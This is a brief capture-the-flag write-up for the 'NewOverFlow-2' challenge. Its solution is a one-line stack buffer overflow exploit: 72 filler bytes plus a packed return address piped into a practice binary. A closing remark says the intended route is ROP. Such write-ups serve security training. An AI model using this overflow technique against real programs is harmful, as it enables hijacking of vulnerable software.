# NewOverFlow-2

## Summary

Okay now lets try mainpulating arguments. program. You can find it in /problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7 on the shell server. Source.

## Solution

cd /problems/newoverflow-2_1_bcd752d56a87efb5dfc9803b461809f7; python2 -c 'from pwn import *; print "A"*72 + p64(0x040084d)' | ./vuln

## Notes

Guess the intended way is to use ROP check the solution.py
